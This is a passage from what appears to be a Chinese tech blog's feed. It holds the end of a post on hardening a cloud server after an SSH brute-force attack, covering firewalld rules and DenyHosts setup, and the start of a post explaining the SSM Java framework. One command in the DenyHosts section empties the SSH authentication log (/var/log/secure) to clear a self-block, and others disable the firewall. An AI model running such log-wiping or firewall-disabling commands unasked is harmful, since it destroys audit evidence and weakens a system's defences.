firewalld</span><br></pre></td></tr></table></figure><p>对应的关闭防火墙命令是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure><h3 id="3-配置防火墙"><a href="#3-配置防火墙" class="headerlink" title="3. 配置防火墙"></a>3. 配置防火墙</h3><p>接下来就是配置防火墙放行规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-port=80/tcp --permanent</span><br><span class="line"></span><br><span class="line">firewall-cmd --add-port=443/tcp --permanent</span><br></pre></td></tr></table></figure><p>这里放行了80端口和443端口，用于web服务器，并且支持https必须要开启443端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--permanent 参数表示该条规则永久生效</span><br></pre></td></tr></table></figure><p>如果你想放行的端口号是连贯的，也可以直接指定范围，例如：<br>firewall-cmd –add-port=8080-8888/tcp –permanent<br>如果配置错了，还可以取消：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --remove-port=80/tcp --permanent</span><br><span class="line"></span><br><span class="line">firewall-cmd --remove-port=443/tcp --permanent</span><br><span class="line"></span><br><span class="line">firewall-cmd --remove-port=8080-8888/tcp --permanent</span><br></pre></td></tr></table></figure><p>当我们添加或移除防火墙规则后，需重新加载才能生效，使用–reload参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>配置好后我们可以通过–list-all参数查看防火墙规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --list-all</span><br></pre></td></tr></table></figure><h3 id="4-使防火墙在系统重启后还能正常运行"><a href="#4-使防火墙在系统重启后还能正常运行" class="headerlink" title="4. 使防火墙在系统重启后还能正常运行"></a>4. 使防火墙在系统重启后还能正常运行</h3><p>设置防火墙开机自启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> firewalld</span><br></pre></td></tr></table></figure><p>如果只开启了防火墙，没有设置防火墙开机自启，那么服务器重启后，防火墙会回到关闭状态，可以防止因为防火墙错误原因无法连接服务器的情况。当配置好之后，再设置开机自启，保证防火墙能够正常运行。<br>取消防火墙开机自启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br></pre></td></tr></table></figure><p>当然了，配置了防火墙开机自启后，你只是关闭了防火墙，而没有取消开机自启，那么防火墙只是临时关闭，在下次服务器重新启动后，防火墙会自动开启回来。如果你是想要完全关闭防火墙，不要忘记运行这条命令。</p><h3 id="5-防火墙相关知识"><a href="#5-防火墙相关知识" class="headerlink" title="5.防火墙相关知识"></a>5.防火墙相关知识</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#firewallan安装</span></span><br><span class="line">yum install firewalld</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查防火墙开启状态</span></span><br><span class="line">firewall-cmd --state</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动firewall</span></span><br><span class="line">systemctl start firewalld.service</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置开机自启</span></span><br><span class="line">systemctl <span class="built_in">enable</span> firewalld.service</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启防火墙</span></span><br><span class="line">systemctl restart firewalld.service</span><br><span class="line"></span><br><span class="line"><span class="comment">#在不改变状态的条件下重新加载防火墙</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line"><span class="comment">#查询服务的启动状态</span></span><br><span class="line">firewall-cmd --query-service ssh</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看开放的端口</span></span><br><span class="line">firewall-cmd --list-ports</span><br><span class="line"></span><br><span class="line"><span class="comment">#开放端口命令含义:</span></span><br><span class="line">firewall-cmd --zone=public --add-port=3306/tcp --permanent</span><br><span class="line"></span><br><span class="line">--zone <span class="comment">#作用域</span></span><br><span class="line">--add-port=80/tcp  <span class="comment">#添加端口，格式为：端口/通讯协议</span></span><br><span class="line">--permanent   <span class="comment">#永久生效，没有此参数重启后失效</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#firewall-cmd常用参数及作用</span></span><br><span class="line">参数　　　　　　　　　　　　　　　　　　　作用</span><br><span class="line">--get-default-zone　　　　　　　查询默认的区域名称</span><br><span class="line">--set-default-zone=&lt;区域名称&gt;　　　   设置默认的区域，使其永久生效</span><br><span class="line">--get-zones　　　　　　　　　 　　 显示可用的区域</span><br><span class="line">--get-services　　　　　　　　　　　　显示预先定义的服务</span><br><span class="line">--get-active-zones　　　　　　　显示当前正在使用的区域与网卡名称</span><br><span class="line">--add-source=　　　　　　　　　　　　将源自此IP或子网的流量导向指定的区域</span><br><span class="line">--remove-source=　　　　　　不再将源自此IP或子网的流量导向某个指定区域</span><br><span class="line">--add-interface=&lt;网卡名称&gt;　　　将源自该网卡的所有流量都导向某个指定区域</span><br><span class="line">--change-interface=&lt;网卡名称&gt;  将某个网卡与区域进行关联</span><br><span class="line">--list-all　　　　　　　　　　显示当前区域的网卡配置参数、资源、端口以及服务等信息</span><br><span class="line">--list-all-zones　　　　　　显示所有区域的网卡配置参数、资源、端口以及服务等信息</span><br><span class="line">--add-service=&lt;服务名&gt;　　　　　　设置默认区域允许该服务的流量</span><br><span class="line">--add-port=&lt;端口号/协议&gt;　　　　　　设置默认区域允许该端口的流量</span><br><span class="line">--remove-service=&lt;服务名&gt;　　设置默认区域不再允许该服务的流量</span><br><span class="line">--remove-port=&lt;端口号/协议&gt;　　设置默认区域不再允许该端口的流量</span><br><span class="line">--reload　　　　　　　　　　让“永久生效”的配置规则立即生效，并覆盖当前的配置规则</span><br><span class="line">--panic-on　　　　　　　　　　开启应急状况模式</span><br><span class="line">--panic-off　　　　　　　　　　关闭应急状况模式</span><br></pre></td></tr></table></figure><h2 id="五、安装DenyHosts-2-6预防SSH爆破"><a href="#五、安装DenyHosts-2-6预防SSH爆破" class="headerlink" title="五、安装DenyHosts-2.6预防SSH爆破"></a>五、安装DenyHosts-2.6预防SSH爆破</h2><h3 id="1-安装DenyHosts-2-6"><a href="#1-安装DenyHosts-2-6" class="headerlink" title="1.安装DenyHosts-2.6"></a>1.安装DenyHosts-2.6</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#手动下载地址：https://sourceforge.net/projects/denyhosts/files/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解压源码包</span></span><br><span class="line">tar zxvf DenyHosts-2.6.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#进入安装解压目录</span></span><br><span class="line"><span class="built_in">cd</span> DenyHosts-2.6</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装DenyHosts</span></span><br><span class="line">python setup.py install  </span><br><span class="line">                                 </span><br><span class="line"><span class="comment">#默认安装路径</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/denyhosts/</span><br><span class="line"></span><br><span class="line"><span class="comment">#denyhosts.cfg为配置文件</span></span><br><span class="line">cp denyhosts.cfg-dist denyhosts.cfg  </span><br><span class="line"></span><br><span class="line"><span class="comment">#daemon-control为启动程序</span></span><br><span class="line">cp daemon-control-dist daemon-control</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加root权限</span></span><br><span class="line">chown root daemon-control</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改为可执行文件</span></span><br><span class="line">chmod 700 daemon-control</span><br><span class="line"></span><br><span class="line"><span class="comment">#对daemon-control进行软连接，方便管理</span></span><br><span class="line">ln -s /usr/share/denyhosts/daemon-control /etc/init.d</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动denyhosts</span></span><br><span class="line">/etc/init.d/daemon-control start</span><br><span class="line"></span><br><span class="line"><span class="comment">#将denghosts设成开机启动</span></span><br><span class="line">chkconfig daemon-control on</span><br></pre></td></tr></table></figure><blockquote><p>启动前先将自己的ip加入白名单，不然启动后下一次登陆就给屏蔽了<br>vim /etc/hosts.allow<br>添加这行sshd:[你的ip]<br>检查黑名单是否有自己ip，有则删除<br>vim /etc/hosts.deny</p></blockquote><h3 id="2-denyhosts-cfg配置简要说明"><a href="#2-denyhosts-cfg配置简要说明" class="headerlink" title="2.denyhosts.cfg配置简要说明"></a>2.denyhosts.cfg配置简要说明</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编辑配置文件，另外关于配置文件一些参数，通过grep -v &quot;^#&quot; denyhosts.cfg查看</span></span><br><span class="line">vim /usr/share/denyhosts/denyhosts.cfg</span><br><span class="line"></span><br><span class="line"><span class="comment">#ssh 日志文件 </span></span><br><span class="line">SECURE_LOG = /var/<span class="built_in">log</span>/secure</span><br><span class="line"></span><br><span class="line"><span class="comment">#redhat的位置</span></span><br><span class="line">/var/<span class="built_in">log</span>/secure</span><br><span class="line"><span class="comment">#Mandrake、FreeBSD的位置</span></span><br><span class="line">/var/<span class="built_in">log</span>/auth.log</span><br><span class="line"><span class="comment">#SUSE的位置</span></span><br><span class="line">var/<span class="built_in">log</span>/messages</span><br><span class="line"></span><br><span class="line"><span class="comment">#控制用户登陆的文件</span></span><br><span class="line">HOSTS_DENY = /etc/hosts.deny </span><br><span class="line"></span><br><span class="line"><span class="comment">#过多久后清除已经禁止的，空表示永远不解禁</span></span><br><span class="line">PURGE_DENY = </span><br><span class="line"></span><br><span class="line"><span class="comment">#禁止的服务名，如还要添加其他服务，只需添加逗号跟上相应的服务即可</span></span><br><span class="line">BLOCK_SERVICE = sshd </span><br><span class="line"></span><br><span class="line"><span class="comment">#允许无效用户失败的次数</span></span><br><span class="line">DENY_THRESHOLD_INVALID = 5 </span><br><span class="line"></span><br><span class="line"><span class="comment">#允许普通用户登陆失败的次数</span></span><br><span class="line">DENY_THRESHOLD_VALID = 10 </span><br><span class="line"></span><br><span class="line"><span class="comment">#允许root登陆失败的次数</span></span><br><span class="line">DENY_THRESHOLD_ROOT = 1 </span><br><span class="line"></span><br><span class="line"><span class="comment">#将deny的host或ip纪录到Work_dir中</span></span><br><span class="line">WORK_DIR = /usr/<span class="built_in">local</span>/share/denyhosts/data</span><br><span class="line"></span><br><span class="line"><span class="comment">#假如设定为YES，那么已经设为白名单中的IP登陆失败也会被设为可疑，也会被列入黑名单中，设定NO的意思就相反。</span></span><br><span class="line">SUSPICIOUS_LOGIN_REPORT_ALLOWED_HOSTS=YES</span><br><span class="line"></span><br><span class="line"><span class="comment">#是否进行域名反解析</span></span><br><span class="line">HOSTNAME_LOOKUP=YES </span><br><span class="line"></span><br><span class="line"><span class="comment">#程序的进程ID</span></span><br><span class="line">LOCK_FILE = /var/run/denyhosts.pid </span><br><span class="line"></span><br><span class="line"><span class="comment">#管理员邮件地址,它会给管理员发邮件</span></span><br><span class="line">ADMIN_EMAIL = root@localhost </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用denyhosts会将自己的IP自动加到hosts-deny的解决办法"><a href="#使用denyhosts会将自己的IP自动加到hosts-deny的解决办法" class="headerlink" title="使用denyhosts会将自己的IP自动加到hosts.deny的解决办法"></a>使用denyhosts会将自己的IP自动加到hosts.deny的解决办法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看denyhosts.cfg配置文件的SECURE_LOG</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; /var/<span class="built_in">log</span>/secure</span><br><span class="line"></span><br><span class="line"><span class="comment">#重置系统日志计数器</span></span><br><span class="line">systemctl restart rsyslog</span><br><span class="line"></span><br><span class="line"><span class="comment">#到denyhosts的data目录下的其它文件中关于hosts.deny中的IP记录一并清空(也可选择你需要的ip进行删除记录)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将hosts.deny中你要解禁的IP删除并保存</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">/usr/share/denyhosts/daemon-control restart</span><br></pre></td></tr></table></figure><h2 id="六、结尾"><a href="#六、结尾" class="headerlink" title="六、结尾"></a>六、结尾</h2><p>服务器被暴力破解成功，请尽快排查安全风险，我收到短信就打开阿里云控制台关停了服务器，因为破解成功到脚本命令执行几乎是同时的，没有多想就关闭了服务器，反正就部署了一个项目，然后就将服务器给格式化了，神知道下了什么妖魔鬼怪的木马程序到哪旮沓文件夹下，直接格式化，清净了，等加固了服务器的安全问题，重新部署项目吧。</p><h3 id="最后，感谢阅读。"><a href="#最后，感谢阅读。" class="headerlink" title="最后，感谢阅读。"></a>最后，感谢阅读。</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;新手刚接触ECS云服务器还不懂需要做些什么，只能见招拆招了。今天服务器遭受SSH暴力破解，所以整理一些东西让遇到这些问题的人可以减少这个烦恼，废话不多说进入正题。&lt;br&gt;起因：&lt;br&gt;手机收到阿里云提示短信，检测到ECS服务器出现紧急安全事件：访问</summary>
      
    
    
    
    
    <category term="记录" scheme="http://zhizhi111.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>详解SSM框架工作原理及流程</title>
    <link href="http://zhizhi111.github.io/2021/12/28/SSM%E6%A1%86%E6%9E%B6%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B/"/>
    <id>http://zhizhi111.github.io/2021/12/28/SSM%E6%A1%86%E6%9E%B6%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B/</id>
    <published>2021-12-28T10:49:20.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、什么是SSM框架："><a href="#一、什么是SSM框架：" class="headerlink" title="一、什么是SSM框架："></a>一、什么是SSM框架：</h2><p>SSM框架是Spring、SpringMVC和Mybatis框架的整合，是标准的MVC模式，将整个系统划分为View层，Controller层，Service层，DAO层四层，使用Spring MVC负责请求的转发和视图管理，Spring实现业务对象管理，Mybatis作为数据对象的持久化引擎。</p><h2 id="二、各框架介绍"><a href="#二、各框架介绍" class="headerlink" title="二、各框架介绍"></a>二、各框架介绍</h2><ol><li>Spring</li></ol><p>Spring就像是整个项目中装配bean的大工厂，在配置文件中可以指定使用特定的参数去调用实体类的构造方法来实例化对象。也可以称之为项目中的粘合剂。<br>Spring的核心思想是IoC（控制反转），即不再需要程序员去显式地<code>new</code>一个对象，而是让Spring框架帮你来完成这一切。</p><ol start="2"><li>SpringMVC</li></ol><p>SpringMVC作用于web层，相当于controller，与struts中的action一样，都是用来处理用户请求的。同时，相比于struts2来说，更加细粒度，它是基于方法层面的，而struts是基于类层面的。Spring MVC 分离了控制器、模型对象、分派器以及处理程序对象的角色，这种分离让它们更容易进行定制。</p><p>SpringMVC在项目中拦截用户请求，它的核心Servlet即DispatcherServlet承担中介或是前台这样的职责，将用户请求通过HandlerMapping去匹配Controller，Controller就是具体对应请求所执行的操作。SpringMVC相当于SSH框架中struts。</p><p>SpringMVC具体工作流程如下</p><p><img src="https://s2.loli.net/2021/12/28/MQKh3PsZGeUNty4.jpg" alt="24.jpg"></p><ol start="3"><li>mybatis</li></ol><p>MyBatis 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以使用简单的 XML 或注解来配置和映射原生信息，将接口和 Java 的 POJOs(Plain Old Java Objects,普通的 Java对象)映射成数据库中的记录。</p><p>mybatis是对jdbc的封装，它让数据库底层操作变的透明。</p><p>mybatis的操作都是围绕一个sqlSessionFactory实例展开的。mybatis通过配置文件关联到各实体类的Mapper文件，Mapper文件中配置了每个类对数据库所需进行的sql语句映射。在每次与数据库交互时，通过sqlSessionFactory拿到一个sqlSession，再执行sql命令。</p><p>Mybatis层次图：</p><p><img src="https://s2.loli.net/2021/12/29/NVsUmGkYPcpXg4y.png" alt="27.png"></p><h2 id="三、SSM框架中各层介绍"><a href="#三、SSM框架中各层介绍" class="headerlink" title="三、SSM框架中各层介绍"></a>三、SSM框架中各层介绍</h2><h3 id="pojo层，Dao层，Mapper层，service层，controller层"><a href="#pojo层，Dao层，Mapper层，service层，controller层" class="headerlink" title="pojo层，Dao层，Mapper层，service层，controller层"></a>pojo层，Dao层，Mapper层，service层，controller层</h3><h3 id="DAO层："><a href="#DAO层：" class="headerlink" title="DAO层："></a>DAO层：</h3><p>DAO层叫数据访问层，全称为data access object，某个DAO一定是和数据库的某一张表一一对应的，其中封装了CRUD（增加Create、检索Retrieve、更新Update和删除Delete）基本操作，DAO只做原子操作。无论多么复杂的查询，dao只是封装增删改查。至于增删查改如何去实现一个功能，dao是不管的。Mapper就是Mybatis操作数据库的那一层，就是DAO层</p><h3 id="Service层："><a href="#Service层：" class="headerlink" title="Service层："></a>Service层：</h3><p>Service层叫服务层，被称为服务，粗略的理解就是对一个或多个DAO进行的再次封装，封装成一个服务，所以这里也就不会是一个原子操作了，需要事物控制。管理具体的功能的。service包含了serviceImpl（service接口的实现类） 是提供给controller 使用的，针对于某些业务将 dao 的对于某些表的crud进行组合，也就是说间接的和数据库打交道。</p><h3 id="Controller层："><a href="#Controller层：" class="headerlink" title="Controller层："></a>Controller层：</h3><p>Controler负责请求转发，接受页面过来的参数，传给Service处理，接到返回值，再传给页面。管理业务（Service）调度和管理跳转的。controller 通过调用service来完成业务逻辑。</p><h3 id="pojo层"><a href="#pojo层" class="headerlink" title="pojo层"></a>pojo层</h3><p>实体类这一层，与数据库中的属性值基本保持一致。有的开发写成pojo，有的写成model，也有domain，也有dto（这里做参数验证，比如password不能为空等）。</p><h3 id="mapper层"><a href="#mapper层" class="headerlink" title="mapper层"></a>mapper层</h3><p>Mapper就是Mybatis操作数据库的那一层，就是DAO层，对数据库进行数据持久化操作，他的方法语句是直接针对数据库操作的。</p><p>各个层之间的流程如下：</p><p><img src="https://s2.loli.net/2021/12/28/AWg2Q4Ze7lrGItC.jpg" alt="26.jpg"></p><p><img src="https://s2.loli.net/2021/12/28/hkmle1TdL4g3yrx.jpg" alt="25.jpg"></p><h2 id="四、框架核心原理"><a href="#四、框架核心原理" class="headerlink" title="四、框架核心原理"></a>四、框架核心原理</h2><ol><li><p>AOP 面向切面编程（AOP）提供另外一种角度来思考程序结构，通过这种方式弥补了面向对象编程（OOP）的不足。除了类（classes）以外，AOP提供了切面。切面对关注点进行模块化，例如横切多个类型和对象的事务管理。Spring的一个关键的组件就是AOP框架，可以自由选择是否使用AOP。提供声明式企业服务，特别是为了替代EJB声明式服务。最重要的服务是声明性事务管理，这个服务建立在Spring的抽象事物管理之上。允许用户实现自定义切面，用AOP来完善OOP的使用可以把Spring AOP看作是对Spring的一种增强。AOP的实现乃至spring框架基本上核心代码都是基于Java语言的反射机制（所谓的反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。）。<br>AOP主要作用就是不通过修改源代码的方式、将非核心功能代码织入来实现对方法的增强。那么Spring AOP的底层如何实现对方法的增强？实现的关键在于使用了代理模式。代理模式的作用就是为其它对象提供一种代理，以控制对这个对象的访问，用于解决在直接访问对象时带来的各种问题，比如要访问的对象在远程的机器上。在面向对象系统中，由于其他某些原因（对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问）等<br>代理主要分为两种方式：静态代理和动态代理</p></li><li><p>IOC IoC不是一种技术，只是一种思想，一个重要的面向对象编程的法则，它能指导我们如何设计出松耦合、更优良的程序。有了IoC容器后，把创建和查找依赖对象的控制权交给了容器，由容器进行注入组合对象，所以相较于传统的java servlet需要自己request.getParamiter等需要一系列取值，转换中文，转换值类型的繁琐，更重要的是使得程序的整个体系结构变得非常灵活。<br>自定义一个IOC容器的思路：<br>Map做一个容器，然后用解析xml文件的工具解析出需要扫描的包。利用Java反射机制拿到锁具有的方法，属性，注入到Map容器中</p></li><li><p>DI 依赖注入，是组件之间依赖关系由容器在运行期决定，形象的说，即由容器动态地将某个依赖关系注入到组件之中。依赖注入的目的并非为软件系统带来更多功能，而是为了提升组件重用的频率，并为系统搭建一个灵活、可扩展的平台。通过依赖注入机制，我们只需要通过简单的配置，而无需任何代码就可指定目标需要的资源，完成自身的业务逻辑，而不需要关心具体的资源来自何处，由谁实现。</p></li></ol><h3 id="AOP-IoC以及DI我单独写了两篇博客，比较详细的介绍了其思想，大家可以在”笔记”标签中找到。"><a href="#AOP-IoC以及DI我单独写了两篇博客，比较详细的介绍了其思想，大家可以在”笔记”标签中找到。" class="headerlink" title="AOP,IoC以及DI我单独写了两篇博客，比较详细的介绍了其思想，大家可以在”笔记”标签中找到。"></a>AOP,IoC以及DI我单独写了两篇博客，比较详细的介绍了其思想，大家可以在”笔记”标签中找到。</h3><h2 id="五、SSM框架工作流程"><a href="#五、SSM框架工作流程" class="headerlink" title="五、SSM框架工作流程"></a>五、SSM框架工作流程</h2><ol><li>用户访问客户端发出请求，请求会被Spring MVC中的前端控制器拦截，前端控制器配置在web.xml中。</li><li>DispatcherServlet拦截到请求后，调用处理器映射器在dispatcher-servlet.xml文件中</li><li>处理器映射器根据URL找到具体的处理器，生成具体的处理器对象及处理器拦截器（如果有生成）返回给前端控制器。</li><li>前端控制器会选择合适的处理器适配器</li><li>HandlerAdapter会调用并执行Handler（Controller层）也被称之为后端控制器</li><li>处理器对持久化对象进行增删改查</li><li>POJO将操作映射到ORM框架</li><li>ORM框架将操作映射到数据库</li><li>关系数据库把操作的数据返回给ORM框架</li><li>ORM框架把数据返回给持久化对象</li><li>持久化对象把数据返回给Handler</li><li>Handler返回一个ModelAndView对象，包含模型和视图名</li><li>处理器适配器将这个模型返回给前端控制器</li><li>前端控制器会根据ModelAndView选择一个合适的ViewResolver</li><li>视图解析器解析后返回一个合适的视图View给前端控制器</li><li>前端控制器对view进行渲染</li><li>返回给客户端浏览器显示</li></ol><h3 id="SSM框架全网最详细流程图如下："><a href="#SSM框架全网最详细流程图如下：" class="headerlink" title="SSM框架全网最详细流程图如下："></a>SSM框架全网最详细流程图如下：</h3><p><img src="https://s2.loli.net/2021/12/28/pJsGW5PoaBcOrFZ.jpg" alt="22.jpg"></p><h2 id="六、SSM框架整合"><a href="#六、SSM框架整合" class="headerlink" title="六、SSM框架整合"></a>六、SSM框架整合</h2><p>要让几个框架相互配合，配置文件怎么写，项目的目录结构怎么设计对我这样一个新手来说实在很头疼。<br>目前我也只刚刚写过一个用户登录的demo，在此记录一下。</p><h3 id="一-、项目目录结构"><a href="#一-、项目目录结构" class="headerlink" title="(一)、项目目录结构"></a>(一)、项目目录结构</h3><p> －LoginDemo<br>      &emsp;&emsp; －src<br>         &emsp;&emsp; &emsp; －项目主包<br>       &emsp;  &emsp; &emsp; &emsp;     －controller<br>    &emsp;  &emsp; &emsp; &emsp;      －mapper<br>   &emsp;  &emsp; &emsp; &emsp;       －entity<br>  &emsp;  &emsp; &emsp; &emsp;        －service<br>   &emsp;&emsp; －web<br>  &emsp;&emsp; &emsp; －WEB-INF<br>   &emsp;  &emsp; &emsp; &emsp;    －log4j.properties<br>   &emsp;  &emsp; &emsp; &emsp;      －spring-mybatis.xml<br>   &emsp;  &emsp; &emsp; &emsp;    －springMVC-config.xml<br>  &emsp;  &emsp; &emsp; &emsp;      －web.xml<br>    &emsp;&emsp; &emsp;  －index.jsp<br>    &emsp;&emsp;  －pom.xml</p><h3 id="二、需要引入的包-pom-xml"><a href="#二、需要引入的包-pom-xml" class="headerlink" title="二、需要引入的包 (pom.xml)"></a>二、需要引入的包 (pom.xml)</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span 